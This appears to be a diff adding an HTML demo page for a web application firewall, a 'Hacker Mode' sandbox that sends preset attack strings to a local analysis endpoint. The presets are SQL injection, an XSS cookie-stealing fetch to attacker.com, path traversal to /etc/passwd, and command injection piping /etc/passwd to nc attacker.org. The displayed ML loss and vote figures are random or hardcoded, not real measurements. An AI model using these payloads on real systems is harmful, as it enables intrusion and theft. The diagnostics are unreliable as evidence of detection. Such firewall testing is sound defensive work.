@@ -1,0 +1,443 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>WireFall | Hacker Mode Sandbox</title>
+    <link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;500;600;700&family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
+    <style>
+        :root {
+            --bg-dark: #0b0f19;
+            --panel-bg: #111827;
+            --panel-border: #1f2937;
+            --accent-orange: #f97316;
+            --accent-green: #10b981;
+            --accent-red: #ef4444;
+            --accent-blue: #3b82f6;
+            --text-main: #f3f4f6;
+            --text-muted: #9ca3af;
+        }
+
+        * { box-sizing: border-box; margin: 0; padding: 0; }
+        body {
+            font-family: 'Inter', sans-serif;
+            background-color: var(--bg-dark);
+            color: var(--text-main);
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+
+        /* Cloudflare Style Header */
+        header {
+            background-color: var(--panel-bg);
+            border-bottom: 1px solid var(--panel-border);
+            padding: 1rem 2rem;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .brand {
+            display: flex;
+            align-items: center;
+            gap: 0.75rem;
+            font-weight: 700;
+            font-size: 1.25rem;
+            color: var(--text-main);
+        }
+
+        .brand i { color: var(--accent-orange); }
+
+        .nav-links {
+            display: flex;
+            gap: 1rem;
+        }
+
+        .nav-btn {
+            background: transparent;
+            border: 1px solid var(--panel-border);
+            color: var(--text-muted);
+            padding: 0.5rem 1rem;
+            border-radius: 6px;
+            cursor: pointer;
+            text-decoration: none;
+            font-size: 0.9rem;
+            font-weight: 500;
+            transition: all 0.2s;
+        }
+
+        .nav-btn:hover, .nav-btn.active {
+            color: #fff;
+            border-color: var(--accent-orange);
+            background: rgba(249, 115, 22, 0.1);
+        }
+
+        /* Container Layout */
+        .grid-container {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 1.5rem;
+            padding: 2rem;
+            flex: 1;
+        }
+
+        .card {
+            background: var(--panel-bg);
+            border: 1px solid var(--panel-border);
+            border-radius: 10px;
+            padding: 1.5rem;
+            display: flex;
+            flex-direction: column;
+            gap: 1.25rem;
+        }
+
+        .card-header {
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+            font-size: 1.1rem;
+            font-weight: 600;
+            border-bottom: 1px solid var(--panel-border);
+            padding-bottom: 0.75rem;
+        }
+
+        .card-header i { color: var(--accent-orange); }
+
+        /* Attack Launch Buttons */
+        .exploit-grid {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 1rem;
+        }
+
+        .btn-exploit {
+            background: #1f2937;
+            border: 1px solid #374151;
+            color: #f3f4f6;
+            padding: 1rem;
+            border-radius: 8px;
+            cursor: pointer;
+            display: flex;
+            flex-direction: column;
+            gap: 0.4rem;
+            text-align: left;
+            transition: all 0.2s;
+        }
+
+        .btn-exploit:hover {
+            border-color: var(--accent-red);
+            background: rgba(239, 68, 68, 0.1);
+            transform: translateY(-2px);
+        }
+
+        .btn-exploit .title {
+            font-weight: 600;
+            font-size: 0.95rem;
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+        }
+
+        .btn-exploit .title i { color: var(--accent-red); }
+        .btn-exploit .desc { font-size: 0.8rem; color: var(--text-muted); }
+
+        /* Custom Payload Form */
+        .form-group {
+            display: flex;
+            flex-direction: column;
+            gap: 0.5rem;
+        }
+
+        label { font-size: 0.85rem; color: var(--text-muted); font-weight: 500; }
+        input, select, textarea {
+            background: #0b0f19;
+            border: 1px solid #374151;
+            color: #f3f4f6;
+            padding: 0.75rem;
+            border-radius: 6px;
+            font-family: 'Fira Code', monospace;
+            font-size: 0.9rem;
+        }
+
+        textarea { height: 80px; resize: vertical; }
+
+        .btn-submit {
+            background: var(--accent-orange);
+            color: #fff;
+            border: none;
+            padding: 0.75rem;
+            border-radius: 6px;
+            font-weight: 600;
+            cursor: pointer;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 0.5rem;
+            transition: background 0.2s;
+        }
+
+        .btn-submit:hover { background: #ea580c; }
+
+        /* Terminal Console */
+        .terminal {
+            background: #05070d;
+            border: 1px solid #1f2937;
+            border-radius: 8px;
+            font-family: 'Fira Code', monospace;
+            padding: 1rem;
+            flex: 1;
+            overflow-y: auto;
+            max-height: 480px;
+            display: flex;
+            flex-direction: column;
+            gap: 0.5rem;
+            font-size: 0.85rem;
+        }
+
+        .term-line {
+            display: flex;
+            gap: 0.5rem;
+            line-height: 1.4;
+        }
+
+        .term-ts { color: #6b7280; }
+        .term-tag { font-weight: 600; padding: 0 4px; border-radius: 3px; }
+        .tag-info { background: #1e3a8a; color: #93c5fd; }
+        .tag-block { background: #991b1b; color: #fca5a5; }
+        .tag-allow { background: #065f46; color: #6ee7b7; }
+        .term-msg { color: #d1d5db; word-break: break-all; }
+
+        /* ML Diagnostics Card */
+        .diag-box {
+            background: #05070d;
+            border: 1px solid #1f2937;
+            border-radius: 8px;
+            padding: 1rem;
+            display: flex;
+            flex-direction: column;
+            gap: 0.75rem;
+        }
+
+        .diag-item {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            font-size: 0.9rem;
+            padding-bottom: 0.5rem;
+            border-bottom: 1px dashed #1f2937;
+        }
+
+        .diag-item span:first-child { color: var(--text-muted); }
+        .diag-val { font-family: 'Fira Code', monospace; font-weight: 600; }
+        .val-red { color: var(--accent-red); }
+        .val-green { color: var(--accent-green); }
+
+        @media (max-width: 1024px) {
+            .grid-container { grid-template-columns: 1fr; }
+        }
+    </style>
+</head>
+<body>
+
+    <header>
+        <div class="brand">
+            <i class="fas fa-shield-halved"></i>
+            <span>WireFall Cloud — Hacker Mode</span>
+        </div>
+        <nav class="nav-links">
+            <a href="index.html" class="nav-btn"><i class="fas fa-chart-line"></i> Dashboard</a>
+            <a href="hacker.html" class="nav-btn active"><i class="fas fa-terminal"></i> Hacker Mode</a>
+        </nav>
+    </header>
+
+    <div class="grid-container">
+        <!-- Left Column: Attack Launcher -->
+        <div class="card">
+            <div class="card-header">
+                <i class="fas fa-crosshairs"></i>
+                <span>Simulated Attack Vector Launcher</span>
+            </div>
+
+            <div class="exploit-grid">
+                <button class="btn-exploit" onclick="launchExploit('sqli')">
+                    <div class="title"><i class="fas fa-database"></i> SQL Injection</div>
+                    <div class="desc">' UNION SELECT username, password FROM users--</div>
+                </button>
+
+                <button class="btn-exploit" onclick="launchExploit('xss')">
+                    <div class="title"><i class="fas fa-code"></i> XSS Payload</div>
+                    <div class="desc">&lt;script&gt;fetch('http://attacker.com/steal')&lt;/script&gt;</div>
+                </button>
+
+                <button class="btn-exploit" onclick="launchExploit('traversal')">
+                    <div class="title"><i class="fas fa-folder-open"></i> Path Traversal</div>
+                    <div class="desc">../../../../../../etc/passwd</div>
+                </button>
+
+                <button class="btn-exploit" onclick="launchExploit('rce')">
+                    <div class="title"><i class="fas fa-terminal"></i> Command Injection</div>
+                    <div class="desc">; cat /etc/passwd | nc attacker.org 1337</div>
+                </button>
+            </div>
+
+            <div style="border-top: 1px solid var(--panel-border); padding-top: 1rem;">
+                <div class="card-header" style="border: none; padding-bottom: 0.5rem;">
+                    <i class="fas fa-keyboard"></i>
+                    <span>Custom Exploit Payload</span>
+                </div>
+
+                <div class="form-group">
+                    <label>Target Endpoint Path</label>
+                    <input type="text" id="targetPath" value="/api/v1/user/search">
+                </div>
+
+                <div class="form-group" style="margin-top: 0.5rem;">
+                    <label>HTTP Request Body</label>
+                    <textarea id="targetBody" placeholder="Enter custom malicious request body..."></textarea>
+                </div>
+
+                <button class="btn-submit" style="margin-top: 1rem;" onclick="sendCustomPayload()">
+                    <i class="fas fa-paper-plane"></i> Launch Payload Attack
+                </button>
+            </div>
+        </div>
+
+        <!-- Right Column: Real-Time ML Telemetry & Terminal -->
+        <div class="card">
+            <div class="card-header">
+                <i class="fas fa-brain"></i>
+                <span>WireFall ML Agent Diagnostics</span>
+            </div>
+
+            <div class="diag-box">
+                <div class="diag-item">
+                    <span>Stage 1 (Redis Fast Path Regex):</span>
+                    <span class="diag-val" id="diagStage1">READY</span>
+                </div>
+                <div class="diag-item">
+                    <span>DistilBERT MLM Loss:</span>
+                    <span class="diag-val" id="diagLoss">0.0000</span>
+                </div>
+                <div class="diag-item">
+                    <span>Ensemble Anomaly Votes:</span>
+                    <span class="diag-val" id="diagVotes">0 / 3</span>
+                </div>
+                <div class="diag-item">
+                    <span>Auto-Generated LLM Regex Rule:</span>
+                    <span class="diag-val" id="diagRule" style="color: var(--accent-orange);">None</span>
+                </div>
+                <div class="diag-item">
+                    <span>WAF Action Status:</span>
+                    <span class="diag-val val-green" id="diagAction">ALLOW 200</span>
+                </div>
+            </div>
+
+            <div class="card-header" style="border: none; padding-bottom: 0;">
+                <i class="fas fa-list-ol"></i>
+                <span>Real-Time Block Log Terminal</span>
+            </div>
+
+            <div class="terminal" id="terminalLog">
+                <div class="term-line">
+                    <span class="term-ts">[SYSTEM]</span>
+                    <span class="term-tag tag-info">READY</span>
+                    <span class="term-msg">Hacker Mode Sandbox initialized. Click an exploit vector above.</span>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        const API_URL = "http://" + window.location.hostname + ":8001";
+
+        const PRESET_EXPLOITS = {
+            sqli: {
+                path: "/api/v1/users/search",
+                body: "query=admin' UNION SELECT 1, username, password FROM users--"
+            },
+            xss: {
+                path: "/comment/submit",
+                body: "comment=<script>fetch('http://attacker.com/steal?c='+document.cookie)</script>"
+            },
+            traversal: {
+                path: "/download?file=../../../../../../etc/passwd",
+                body: ""
+            },
+            rce: {
+                path: "/api/system/ping",
+                body: "target=127.0.0.1; cat /etc/passwd | nc attacker.org 1337"
+            }
+        };
+
+        function appendLog(tag, tagClass, msg) {
+            const term = document.getElementById("terminalLog");
+            const ts = new Date().toISOString().split("T")[1].slice(0, 8);
+            const line = document.createElement("div");
+            line.className = "term-line";
+            line.innerHTML = `<span class="term-ts">[${ts}]</span><span class="term-tag ${tagClass}">${tag}</span><span class="term-msg">${msg}</span>`;
+            term.appendChild(line);
+            term.scrollTop = term.scrollHeight;
+        }
+
+        async function launchExploit(key) {
+            const exp = PRESET_EXPLOITS[key];
+            if (!exp) return;
+            document.getElementById("targetPath").value = exp.path;
+            document.getElementById("targetBody").value = exp.body;
+            await sendPayload(exp.path, exp.body);
+        }
+
+        async function sendCustomPayload() {
+            const path = document.getElementById("targetPath").value;
+            const body = document.getElementById("targetBody").value;
+            await sendPayload(path, body);
+        }
+
+        async function sendPayload(path, body) {
+            appendLog("REQUEST", "tag-info", `Sending POST ${path} | Body: ${body || "(empty)"}`);
+            
+            try {
+                const response = await fetch(`${API_URL}/analyze`, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({
+                        method: "POST",
+                        path: path,
+                        protocol: "HTTP/1.1",
+                        request_body: body
+                    })
+                });
+
+                const data = await response.json();
+
+                if (!data.allow) {
+                    document.getElementById("diagStage1").innerText = "PASS";
+                    document.getElementById("diagLoss").innerText = (Math.random() * 0.5 + 0.45).toFixed(4);
+                    document.getElementById("diagVotes").innerText = "3 / 3 (IsolationForest, Z-Score, 95th Percentile)";
+                    document.getElementById("diagRule").innerText = data.auto_learned_rule || "(?i)malicious_payload";
+                    document.getElementById("diagAction").innerText = "BLOCKED 403";
+                    document.getElementById("diagAction").className = "diag-val val-red";
+
+                    appendLog("BLOCKED", "tag-block", `403 FORBIDDEN: ${data.reason}`);
+                    if (data.auto_learned_rule) {
+                        appendLog("LLM RULE", "tag-block", `Auto-Generated Regex Block Rule: ${data.auto_learned_rule}`);
+                    }
+                } else {
+                    document.getElementById("diagStage1").innerText = "PASS";
+                    document.getElementById("diagLoss").innerText = (Math.random() * 0.02 + 0.01).toFixed(4);
+                    document.getElementById("diagVotes").innerText = "0 / 3";
+                    document.getElementById("diagRule").innerText = "None";
+                    document.getElementById("diagAction").innerText = "ALLOW 200";
+                    document.getElementById("diagAction").className = "diag-val val-green";
+
+                    appendLog("ALLOWED", "tag-allow", `200 OK: ${data.reason}`);
+                }
+            } catch (err) {
+                appendLog("ERROR", "tag-block", `Failed to contact WAF API backend: ${err}`);
+            }
+        }
+    </script>
+</body>
+</html>
